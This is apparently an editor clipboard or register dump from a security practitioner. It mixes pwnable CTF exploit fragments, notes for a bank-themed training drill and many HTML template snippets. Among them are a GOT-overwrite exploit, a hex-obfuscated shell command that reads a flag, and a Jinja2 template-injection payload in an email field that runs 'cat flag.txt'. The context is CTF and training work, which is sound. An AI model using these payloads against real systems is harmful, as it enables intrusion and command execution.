280d3998599ef1584d279c2e4e4e37c7|file:///home/neo/pwnablekr/lotto/solve.py|59|1|V|python
	# We can only overwrite the first passcode (last 4 bytes of name), but we dont have control over the second one, so we have to find another way to get the flag
	# Since the user reads our input as an address, we can use the last 4 bytes as an arbitrary write and overwrite a got entry.
	# We find the instruction where system is called and overwrite the printf got entry with that address.
	WIN_ADDR = exe.sym.login + 127
	log_addr("System call", WIN_ADDR)
	PRINTF_GOT = exe.got.printf
	log_addr("Printf@got", PRINTF_GOT)
	OFFSET = 96
	io.recvuntil(': ')
	io.sendline(b'a' * OFFSET + p32(PRINTF_GOT))
	io.sendlineafter(': ', str(WIN_ADDR))
386df5ccf9ea618795434aafb4351760|file:///home/neo/pwnablekr/lotto/solve.py|10|1|V|python
	
	host = args.HOST or 'svc.pwnable.xyz'
	port = int(args.PORT or 30009)
5acab094e73d8ddb6b9dc9363f9e1e93|file:///home/neo/pwnablekr/cmd2/command|1|5|v|
	/home/neo/pwnablekr/cmd2/cmd2.c
d7b4c3344c7f52a7f8115ad651b38d1c|file:///home/neo/pwnablekr/cmd2/cmd2.c|7|1|V|c
	    printf("%d\n", r);
4f09963db4ff497b8c4d2e3ca84e2507|file:///tmp/zshnF5fki|1|9|v|zsh
	'eval $(echo -ne "expor\x74 PAT\x48\x3d\x2fusr\x2fbin:\x2fbin;cat fla\x67")'
648907a99041d4504661811f1987c2b2|file:///home/neo/cyberranges/work/producer.md|47|13|v|vimwiki
	Atlassian Confluence Widget Connector Macro - Velocity Template Injection (Metasploit)
fcb7c4c9b74c695114c983ca5fd42044|file:///home/neo/cyberranges/work/producer.md|48|41|v|vimwiki
	Needs Atlassian licence key to set up 
32aa17a7e727ac2e2c90ab978c1fdcf1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/vulnerabilities.md|6|30|v|vimwiki
	- Unpatched CVE - probably not because how will they patch it
7eddc3cc39ce4759a283f3410ed59628|file:///home/neo/cyberranges/work/ocbc-cyberdrill/vulnerabilities.md|7|1|V|vimwiki
	7. XXE? - how is it used in a realistic web app
8488b0b034ca07801fb8c476f1f76c16|file:///home/neo/cyberranges/work/ocbc-cyberdrill/vulnerabilities.md|3|1|V|vimwiki
	3. Sensitive Data Exposure - Allows users to create pdfs/files, exposes folder which contains sensitive data in response
2700325ec225df23379f342dd56b6822|file:///home/neo/cyberranges/work/ocbc-cyberdrill/pirates_WEB/setup/app/app.py|101|5|V|python
	    render_template
02df56bb6a7330d5d7eadd8d5fc8fb3e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/pirates_WEB/setup/app/venv/bin/activate|40|14|v|conf
	/temple/ctfs/ccsc_2019/ninja2/venv
ceea254daa606609dc8a0d2d92011037|file:///home/neo/cyberranges/work/ocbc-cyberdrill/pirates_WEB/setup/app/venv/bin/activate|40|1|V|conf
	VIRTUAL_ENV="/home/neo/cyberranges/work/ocbc-cyberdrill/"
4ab70ba2627d4b87ce5c79b5d0ac7300|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/data|1|1|V|
	username=antreas&password=a&email={{{}.__class__.__base__.__subclasses__()[166]()._module.__builtins__['__import__']('os').popen("cat flag.txt").read()}}@gmail.com
6b6f74446758792cae4e40ae9b78b71d|file:///home/neo/pwnablekr/uaf/exploit.py|11|1|V|python
	
	host = args.HOST or 'svc.pwnable.xyz'
	port = int(args.PORT or 30009)
	
843b1465d4eaac91a60b72703f1a9297|file:///home/neo/pwnablekr/memcpy/memcpy.c|1|20|v|c
	gcc -o memcpy memcpy.c -m32 -lm
35e54a9dbd987940b3cfdaa2280d2254|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/css/styles.css|35|2|V|css
	body{
	  background: #f2f2f2;
	  font-family: 'Open Sans', sans-serif;
	}
c2b11153e85bd75d78fab367498747f7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|20|17|V|html
	                <i class="fa fa-search"></i>
587ef8c73ab65a2171f553e7483376c2|file:///home/neo/cyberranges/work/ocbc-cyberdrill/vulnerabilities.md|4|1|V|vimwiki
	4. Insecure Deserialization - PHP object deserialization - flask-serialize https://pypi.org/project/flask-serialize/#:~:text=Flask%2Dserialize%20is%20intended%20for,suitable%20for%20two%20way%20serialization. - or custom serialization - cookie containing username + password hash to store session, attacker can change username to hijack the session of another user - backend only checks for username to choose session
a2699e26253a362537cd2659f90d964e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/story.md|1|1|v|vimwiki
	You are part of the blue team of a new banking startup company
53ca0ee73f876093f9008d30477e9af6|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|18|1|V|html
	        <!-- See www.bootstrapcdn.com . This online stylesheet seems to be only for the social media icons in the footer, 
		possibly download this later to be sure: -->
1d0a50a210fa268312365a1a9c3bbdb7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|18|1|V|html
	        <!-- See www.bootstrapcdn.com . This online stylesheet seems to be only for the social media icons in the footer, 
		possibly download this later to be sure: -->
	        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
07fdf5c550818b5c91dd38f700d59687|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|22|8|V|html
	        <!-- Fonts (Jocca edit: I switched the fonts: <link href='http://fonts.googleapis.com/css?family=Open+Sans|Baumans' 
		rel='stylesheet' type='text/css'> ) -->
	        <link href="https://fonts.googleapis.com/css?family=Montserrat|Ubuntu" rel="stylesheet"> 
2274b6340e856101b810173616ff5733|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|27|9|V|html
	        <script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
0e75a0d557382d144358aa8473125f53|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|26|9|V|html
	        <!-- include extern jQuery file but fall back to local file if extern one fails to load -->
e371df30bfc3d9cc5cf719db9b7af44c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|28|9|V|html
	        <!-- Jocca edit: Prefix Free: jQuery takes care of the vendor prefixes. In the Sublime Text (3) editor's there's also 
ccbe291dce8c614edd4f196d01ca7d2c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|28|9|V|html
	        <!-- Jocca edit: Prefix Free: jQuery takes care of the vendor prefixes. In the Sublime Text (3) editor's there's also 
		a Autoprefixer plugin (https://packagecontrol.io/packages/Autoprefixer), so maybe that's handier? 
		(for a next project)  -->
f2498a1ddf44aedd66b549fe498b46ba|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|30|9|V|html
	        <!-- JavaScript for the alternative menu. It uses the jQuery slideToggle function -->
e5bd14e03b4bbfea8c30a9d7ee21e8c7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|32|9|V|html
	        <!-- backwards compatible margin-correction -->
	        <!--[if lt IE 9]>
	            <style>
	                header
	                {
	                    margin: 0 auto 20px auto;
	                }                 
	            </style>
	        <![endif]-->        
b1b96db033404784bdd024ddf0d9e974|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.bak|49|1|V|html
		  </div>
2e75f3f7103cff2ec8461ccf0028b8af|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|1|1|V|html
	<!-- The JoccaGit HTML5 Template -->
a9bb4df936aaddd643f7730de678596f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|80|40|v|html
	folio
1d5d43fec932ef0054b52798d52644ae|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|80|37|v|html
	Pori
8f7f4c1ce7a4f933663d10543562b096|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|81|37|v|html
	About
6bff62b10d884fb77428cfe168cd783d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|86|13|v|html
	HTML5
cf6856640deecea14cc7c5cbc59fb087|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|88|7|v|html
	A responsive template
542d4d4ec33a57d44d28d3b18c6157c3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|71|1|V|html
					 	<!-- Jocca edit: javascript:void(0) does nothing because the expression "0" has no 
						effect in JavaScript: <a href="javascript:void(0)">Home</a>. 
					 	The expression "0" is evaluated, but it is not loaded back into the current document. 
						So we can use it for this testmenu since we have no other menu content 
						(a href="" works too but then the page tries to load something and shows white for 
						a lot of milliseconds).		 	
					 	Jocca update: turns out the # sign works just as fine as javascript:void(0), 
						# is simpler, no suggestion of javascripts that you should use and at the bottom 
						of the viewport the url-link is shown -->
fd9e2fb153cf0973040d91b23cb21089|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|58|12|V|html
				<!-- Jocca note: The alternative or togglemobile menu. This menu appears when the browserwidth 
				falls below the max-width assigned in the media queries. See DOM/css layout in Firebug-Firefox or 
				development console's in other browsers. 
				See also script.js -->
7677b1e88d36319384eba6232061c5f9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|78|1|V|html
	            	<!-- <h2 class="hidden">Our navigation</h2> Jocca edit: see Chris's tutorial, i don't agree with using 
			hidden headings just to have a proper html5 outlining, it creates unnecessary and confusing markup imho. 
			As long as you study proper guidelines of html5 elements (on w3schools or other tutorialsites), you're fine -->
160713d386dda38108c64d4d0ecee7a4|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|98|56|v|html
	Enter a word ...
9f0bcfc4b89ed0645a9d4ec8fddc3572|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|113|21|v|html
	Lorem ipsum dolor sit amet, consectetur adipiscing elit. Mauris nisl felis, interdum sit amet bibendum ut, blandit varius sapiens.
9ff9c752b40306409940ad7936e0955a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|119|22|v|html
	Second Article
e5f970ede82a77aa5b3011e60c06b4b3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|121|21|v|html
	Mauris id risus quis ante volutpat aliquet. Aenean in ultricies leo. Phasellus sodales nec massa eget interdum.
70e633c2405447240217ca8ace0a8289|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|126|23|v|html
	Third Article
23b8f1feebe14f5cc1fe00a65740fa73|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|128|22|v|html
	Vivamus hendrerit pharetra lacus, ultricies lobortis augue porttitor eu.  Praesent fermentum commodo quam, non fringilla urna ornare at.
4f46c1dcb7b4998806fe3aa59af92f98|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|133|77|V|html
					<!-- Jocca edit: during (in this case horizontal) alignment of sections 
					(including header, footer, article etc) elements need to be cleared to keep proper 
					vertical alignment of all sections. -->
845f9943643e3f1e15b4add133f4abf1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|135|10|V|html
	        				<!-- ONE BIG TWO SMALL (obts) Section -->
7c8324791d5ada9ea757931c71d343a5|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|177|3|V|html
			<!-- the footer -->
				<!-- client-side refresh year javascript. See http://updateyourfooter.com/
		       		<p>&copy; 2007<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());
	                    </script> - JoccaWeb.nl</p> 
	
	            To be incorporated in new footerscript -->
96d86e1a233175dc4e8592fbf70f01d5|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|79|1|V|html
	                   	<li><a href="#">Home</a></li>
	                   	<li><a href="#">Porfolio</a></li>
	                   	<li><a href="#">About</a></li>
	                   	<li><a href="#">Contact</a></li>
a5234f16d72ccd549504d25d5485af47|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|66|1|V|html
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/forum">Forum</a></li>
d4f859a96c13f551a2771b7fc3a78d38|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|183|25|v|html
	Portfolio
7ea6abb2715bf741524557dc1d6f29fd|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|187|6|V|html
						<a href="#">Contact</a>
9eb689d685e5dfdb63ee77470216587d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|187|1|V|html
	
	                   	<a href="/">Home</a>
	                    <li><a href="/profile">Profile</a>
8dafff86de1ec3e4656f6cb21861eacd|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|187|21|V|html
	                    <li><a href="/forum">Forum</a></li>
58108795373aca5d1a163c944aba874f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|10|10|v|html
	Jocca HTML5 Template
bc9d363bb7398e8b6e24b031e957c26b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|103|1|V|html
	        							<!-- three columns -->
			<section id="three-columns">
	
				<div class="three-columns-wrapper">
	        	
	           		<article>            	               
	               		<img src="/images/elephant-right.png" alt="Eleph R"/>                
	               		<h3>Fast</h3>
	                	
	               		<p>Enjoy the fastest banking experience!</p>
	           		</article>
	            	
	           		<article>            	     
	               		<img src="/images/elephant-left.png" alt="Eleph L"/>
	                	
	               		<h3>Reliable</h3>
	                	
	               		<p>Our web application is bug free and never breaks!</p>
	           		</article>
	            
	           		<article>            	    
	               		<img src="/images/elephant-right.png" alt="Eleph R"/>                
	                		<h3>Secure</h3>
	                
	                		<p>The best security experts make sure that your banking data is safe!</p>
	                </article>
					
				</div><!-- end three columns-wrapper -->
	           	<br class="clear"/>
	        
	        </section>        
	        <section id="obts">        	
	            
	            <div class="obts-wrapper">
	            		
	            	<article>           	 
	               		<h3>Big Article</h3>
	                
	               		<p>This is an HTML5 Responsive template. I was inspired by a few tutorials, but I intensively 
					rewrote the code to get a good working knowledge of the html, css and javascript involved. 
					So I can say I handcoded this template myself in HTML5 and CSS3. Should be browser-compatible 
					from IE7.<br>See the source code for the tutorial-links and my additional comments 
					if you like.</p>                		
	                
	               		<p>Praesent nec augue dapibus, sollicitudin tellus eget, tincidunt lorem. Suspendisse lacinia ex 
					at dolor egestas pulvinar. Sed efficitur vestibulum leo et semper. Morbi condimentum nisi 
					eu urna maximus, vitae suscipit massa convallis. Donec dapibus augue turpis. Suspendisse
					auctor luctus imperdiet. Pellentesque euismod ipsum vel tellus laoreet ultrices.</p>
	            	</article>            
	            	
					<section id="ts">               
	            
	               		<article class="row">                   
	            
	                    		<img src="/images/icon-paper-plane.png" width="80" class="rocket" alt="Some alt text"/>
	                    
	                    		<p>Sed efficitur vestibulum leo et semper. Morbi condimentum nisi eu urna maximus, vitae suscipit massa convallis.</p>
	               		</article> 
	                
	               		<article class="row">                   
	            
	                   		<img src="/images/icon-clock.png" width="80" class="clock" alt="Some alt text"/>
	                    
	                   		<p>Fusce in accumsan dolor. Suspendisse et malesuada nisl. Suspendisse auctor luctus imperdiet.</p>
	                	</article> 
	            	
	            	</section>
				
				</div>			<!-- end obts-wrapper -->
				
2e360a38c4e29d8a28b99faa85a0c715|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.bak|16|1|V|html
	      <div class="row" id="authentication">
		    <div class="col-md-12">
			  <div class="panel panel-primary" style="margin-top:50px">
				<div class="panel-heading">
				  <h3 class="panel-title">Log In</h3>
				</div>
				<div class="panel-body">
				  <form action="/login" method="POST">
					<fieldset>
					  <div class="form-group">
						<label for="username">Username</label>
						<input type="text" id="username" name="username" class="form-control">
					  </div>
					  <div class="form-group">
						<label for="password">Password:</label>
						<div class="controls">
						  <input type="password" id="password" name="password" class="form-control">
						</div>
					  </div>
					  <span>Sign Up <a onclick="document.getElementById('authentication').style.display = 'none'; document.getElementById('registration').style.display = 'block';">here</a> to register (Pirates ONLY!)</span>
					  <br><br>
					  <div class="form-actions">
						<input type="submit" value="Login" class="btn btn-primary">
					  </div>
					</fieldset>
				  </form>
				</div>
			  </div>
			</div>
	      </div>
	
		  <div class="row" id="registration">
		    <div class="col-md-12">
			  <div class="panel panel-primary" style="margin-top:50px">
				<div class="panel-heading">
				  <h3 class="panel-title">Register</h3>
				</div>
				<div class="panel-body">
				  <form action="/register" method="POST">
					<fieldset>
					  <div class="form-group">
						<label for="username">Username</label>
						<input type="text" id="username" name="username" class="form-control">
					  </div>
					  <div class="form-group">
						<label for="password">Password:</label>
						<div class="controls">
						  <input type="password" id="password" name="password" class="form-control">
						</div>
					  </div>
					  <div class="form-group">
						<label for="email">E-mail</label>
						<input type="email" id="email" name="email" class="form-control">
					  </div>
					  <span> Already Registered?<a onclick="document.getElementById('registration').style.display = 'none'; document.getElementById('authentication').style.display = 'block';">here</a> to login</span>
					  <br><br>
					  <div class="form-actions">
						<input type="submit" value="Register" class="btn btn-primary">
					  </div>
					</fieldset>
				  </form>
				</div>
			  </div>
			</div>
	      </div>
e7874d2b88364ab0bb6f87af3f4dec22|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|103|9|V|html
	        <br class="clear"/>        
59b60c1f13874cd3335b937bbaea071b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|174|9|V|html
	        </section>		
24ddc1363e3ade2f7fedf40180017e83|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|30|1|V|python
	        return render_template('login.html')
8e7c14fc5b0572ddd1dea5c4bd5cef48|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|125|185|^v|html
	 (Pirates ONLY!)
ea87f70f69b05e315ece1013e8367e52|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|134|1|V|html
	        <section id="obts">        	
	            
	            <div class="obts-wrapper">
	            		
	            	<article>           	 
	               		<h3>Big Article</h3>
	                
	               		<p>This is an HTML5 Responsive template. I was inspired by a few tutorials, but I intensively 
					rewrote the code to get a good working knowledge of the html, css and javascript involved. 
					So I can say I handcoded this template myself in HTML5 and CSS3. Should be browser-compatible 
					from IE7.<br>See the source code for the tutorial-links and my additional comments 
					if you like.</p>                		
	                
	               		<p>Praesent nec augue dapibus, sollicitudin tellus eget, tincidunt lorem. Suspendisse lacinia ex 
					at dolor egestas pulvinar. Sed efficitur vestibulum leo et semper. Morbi condimentum nisi 
					eu urna maximus, vitae suscipit massa convallis. Donec dapibus augue turpis. Suspendisse
					auctor luctus imperdiet. Pellentesque euismod ipsum vel tellus laoreet ultrices.</p>
	            	</article>            
	            	
					<section id="ts">               
	            
	               		<article class="row">                   
	            
	                    		<img src="/images/icon-paper-plane.png" width="80" class="rocket" alt="Some alt text"/>
	                    
	                    		<p>Sed efficitur vestibulum leo et semper. Morbi condimentum nisi eu urna maximus, vitae suscipit massa convallis.</p>
	               		</article> 
	                
	               		<article class="row">                   
	            
	                   		<img src="/images/icon-clock.png" width="80" class="clock" alt="Some alt text"/>
	                    
	                   		<p>Fusce in accumsan dolor. Suspendisse et malesuada nisl. Suspendisse auctor luctus imperdiet.</p>
	                	</article> 
	            	
	            	</section>
391668f43e7539869e1411c83d75176d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|107|1|V|html
		    <div class="col-md-12">
			  <div class="panel panel-primary" style="margin-top:50px">
				<div class="panel-heading">
				  <h3>Log In</h3>
				</div>
				<div class="panel-body">
				  <form action="/login" method="POST">
					<fieldset>
					  <div class="form-group">
						<label for="username">Username</label>
						<input type="text" id="username" name="username" class="form-control">
					  </div>
					  <div class="form-group">
						<label for="password">Password:</label>
						<div class="controls">
						  <input type="password" id="password" name="password" class="form-control">
						</div>
					  </div>
					  <span>Sign Up <a onclick="document.getElementById('authentication').style.display = 'none'; document.getElementById('registration').style.display = 'block';">here</a> to register</span>
					  <br><br>
					  <div class="form-actions">
						<input type="submit" value="Login" class="btn btn-primary">
					  </div>
					</fieldset>
				  </form>
				</div>
			  </div>
			</div>
	      </div>
	
		  <div class="row" id="registration">
		    <div class="col-md-12">
			  <div class="panel panel-primary" style="margin-top:50px">
				<div class="panel-heading">
				  <h3>Register</h3>
				</div>
				<div class="panel-body">
				  <form action="/register" method="POST">
					<fieldset>
					  <div class="form-group">
						<label for="username">Username</label>
						<input type="text" id="username" name="username" class="form-control">
					  </div>
					  <div class="form-group">
						<label for="password">Password:</label>
						<div class="controls">
						  <input type="password" id="password" name="password" class="form-control">
						</div>
					  </div>
					  <div class="form-group">
						<label for="email">E-mail</label>
						<input type="email" id="email" name="email" class="form-control">
					  </div>
					  <span> Already Registered?<a onclick="document.getElementById('registration').style.display = 'none'; document.getElementById('authentication').style.display = 'block';">here</a> to login</span>
					  <br><br>
					  <div class="form-actions">
						<input type="submit" value="Register" class="btn btn-primary">
					  </div>
					</fieldset>
				  </form>
				</div>
			  </div>
			</div>
	      </div>
8e865a5168850aac79fba3fe7499548d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|105|1|V|html
	    <section id="obts">
	      <div class="obts-wrapper" id="authentication">
	      </div>
	    </section>		
2fb6fcb436427ab9828991d56461889f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|134|1|V|html
	        <section id="obts">        	
	            
	            <div class="obts-wrapper">
	            		
	            	<article>           	 
	               		<h3>Big Article</h3>
	                
	               		<p>This is an HTML5 Responsive template. I was inspired by a few tutorials, but I intensively 
					rewrote the code to get a good working knowledge of the html, css and javascript involved. 
					So I can say I handcoded this template myself in HTML5 and CSS3. Should be browser-compatible 
					from IE7.<br>See the source code for the tutorial-links and my additional comments 
					if you like.</p>                		
	                
	               		<p>Praesent nec augue dapibus, sollicitudin tellus eget, tincidunt lorem. Suspendisse lacinia ex 
					at dolor egestas pulvinar. Sed efficitur vestibulum leo et semper. Morbi condimentum nisi 
					eu urna maximus, vitae suscipit massa convallis. Donec dapibus augue turpis. Suspendisse
					auctor luctus imperdiet. Pellentesque euismod ipsum vel tellus laoreet ultrices.</p>
	            	</article>            
	            	
					<section id="ts">               
	            
	               		<article class="row">                   
	            
	                    		<img src="/images/icon-paper-plane.png" width="80" class="rocket" alt="Some alt text"/>
	                    
	                    		<p>Sed efficitur vestibulum leo et semper. Morbi condimentum nisi eu urna maximus, vitae suscipit massa convallis.</p>
	               		</article> 
	                
	               		<article class="row">                   
	            
	                   		<img src="/images/icon-clock.png" width="80" class="clock" alt="Some alt text"/>
	                    
	                   		<p>Fusce in accumsan dolor. Suspendisse et malesuada nisl. Suspendisse auctor luctus imperdiet.</p>
	                	</article> 
	            	
	            	</section>
				
				</div>			<!-- end obts-wrapper -->
				
				<br class="clear"/>        
03c4910dc064420a3402c240a00ad5f4|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|112|1|V|html
	               		<p>This is an HTML5 Responsive template. I was inspired by a few tutorials, but I intensively 
					rewrote the code to get a good working knowledge of the html, css and javascript involved. 
					So I can say I handcoded this template myself in HTML5 and CSS3. Should be browser-compatible 
					from IE7.<br>See the source code for the tutorial-links and my additional comments 
					if you like.</p>                		
	                
	               		<p>Praesent nec augue dapibus, sollicitudin tellus eget, tincidunt lorem. Suspendisse lacinia ex 
					at dolor egestas pulvinar. Sed efficitur vestibulum leo et semper. Morbi condimentum nisi 
					eu urna maximus, vitae suscipit massa convallis. Donec dapibus augue turpis. Suspendisse
					auctor luctus imperdiet. Pellentesque euismod ipsum vel tellus laoreet ultrices.</p>
	            	</article>            
8b483d943fae277e21b6036f655dab9f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|112|4|V|html
					<section id="ts">               
	            
	               		<article class="row">                   
	            
	                    		<img src="/images/icon-paper-plane.png" width="80" class="rocket" alt="Some alt text"/>
	                    
	                    		<p>Sed efficitur vestibulum leo et semper. Morbi condimentum nisi eu urna maximus, vitae suscipit massa convallis.</p>
	               		</article> 
	                
	               		<article class="row">                   
	            
	                   		<img src="/images/icon-clock.png" width="80" class="clock" alt="Some alt text"/>
	                    
	                   		<p>Fusce in accumsan dolor. Suspendisse et malesuada nisl. Suspendisse auctor luctus imperdiet.</p>
	                	</article> 
	            	
	            	</section>
b169e54c080377a95e1bce50ce9849ac|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|109|12|V|html
	            	<article>           	 
	               		<h3>Big Article</h3>
	            	
					<section id="ts">               
	            
	               		<article class="row">                   
	            
	                    		<img src="/images/icon-paper-plane.png" width="80" class="rocket" alt="Some alt text"/>
	                    
	                    		<p>Sed efficitur vestibulum leo et semper. Morbi condimentum nisi eu urna maximus, vitae suscipit massa convallis.</p>
	               		</article> 
	                
	               		<article class="row">                   
	            
	                   		<img src="/images/icon-clock.png" width="80" class="clock" alt="Some alt text"/>
	                    
	                   		<p>Fusce in accumsan dolor. Suspendisse et malesuada nisl. Suspendisse auctor luctus imperdiet.</p>
	                	</article> 
ee8c6b7f4ff9656ce12757d54340ebaf|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|110|13|V|html
	            	</section>
1aa567e5d1effbc1393e5a1e09b22693|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|110|10|v|html
				<!-- end obts-wrapper -->
6b5657031b3a96c8339b1740e53b27f9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|107|1|V|html
	            <div class="obts-wrapper">
	            		
	            	
				</div>
84e5ad3768c821f5ac8637e9af1b2702|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|111|14|V|html
	            		
507d151f3cbeaa3db900261118549d9d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|111|13|V|html
	            	
eac231d8c99660b04347d9110548c8cc|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.bak|16|1|V|html
	      <div class="row" id="authentication">
		    <div class="col-md-12">
			  <div class="panel panel-primary" style="margin-top:50px">
				<div class="panel-heading">
				  <h3 class="panel-title">Log In</h3>
				</div>
				<div class="panel-body">
				  <form action="/login" method="POST">
					<fieldset>
					  <div class="form-group">
						<label for="username">Username</label>
						<input type="text" id="username" name="username" class="form-control">
					  </div>
					  <div class="form-group">
						<label for="password">Password:</label>
						<div class="controls">
						  <input type="password" id="password" name="password" class="form-control">
						</div>
					  </div>
					  <span>Sign Up <a onclick="document.getElementById('authentication').style.display = 'none'; document.getElementById('registration').style.display = 'block';">here</a> to register (Pirates ONLY!)</span>
					  <br><br>
					  <div class="form-actions">
						<input type="submit" value="Login" class="btn btn-primary">
					  </div>
					</fieldset>
				  </form>
				</div>
			  </div>
			</div>
	      </div>
24d14ea5a8c8dc58205467a9cb2150b2|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|126|1|V|html
	                          <span>Sign Up <a onclick="document.getElementById('authentication').style.display = 'none'; document.getElementById('registration').style.display = 'block';">here</a> to register (Pirates ONLY!)</span>
87dad114e724b5378ca983d91972aef1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.bak|47|1|V|html
		  <div class="row" id="registration">
		    <div class="col-md-12">
			  <div class="panel panel-primary" style="margin-top:50px">
				<div class="panel-heading">
				  <h3 class="panel-title">Register</h3>
				</div>
				<div class="panel-body">
				  <form action="/register" method="POST">
					<fieldset>
					  <div class="form-group">
						<label for="username">Username</label>
						<input type="text" id="username" name="username" class="form-control">
					  </div>
					  <div class="form-group">
						<label for="password">Password:</label>
						<div class="controls">
						  <input type="password" id="password" name="password" class="form-control">
						</div>
					  </div>
					  <div class="form-group">
						<label for="email">E-mail</label>
						<input type="email" id="email" name="email" class="form-control">
					  </div>
					  <span> Already Registered?<a onclick="document.getElementById('registration').style.display = 'none'; document.getElementById('authentication').style.display = 'block';">here</a> to login</span>
					  <br><br>
					  <div class="form-actions">
						<input type="submit" value="Register" class="btn btn-primary">
					  </div>
					</fieldset>
				  </form>
				</div>
			  </div>
			</div>
	      </div>
	
bdc0911acd6ffb28d8e0e893df2d3e0e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|138|1|V|html
	
	                <section id="ts">
	
	                </section>
e8614a34166b830517a17d947cdd2608|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|108|1|V|html
	              <div class="row" id="authentication">
	                <div class="col-md-12">
	                  <div class="panel panel-primary" style="margin-top:50px">
	                    <div class="panel-heading">
	                      <h3>Log In</h3>
	                    </div>
	                    <div class="panel-body">
	                      <form action="/login" method="POST">
	                        <fieldset>
	                          <div class="form-group">
	                            <label for="username">Username:</label>
	                            <input type="text" id="username" name="username" class="form-control">
	                          </div>
	                          <div class="form-group">
	                            <label for="password">Password:</label>
	                            <div class="controls">
	                              <input type="password" id="password" name="password" class="form-control">
	                            </div>
	                          </div>
	                          <span>Sign Up <a onclick="document.getElementById('authentication').style.display = 'none'; document.getElementById('registration').style.display = 'block';">here</a> to register (Pirates ONLY!)</span>
	                          <br><br>
	                          <div class="form-actions">
	                            <input type="submit" value="Login" class="btn btn-primary">
	                          </div>
	                        </fieldset>
	                      </form>
	                    </div>
	                  </div>
	                </div>
	              </div>
				</div>
	
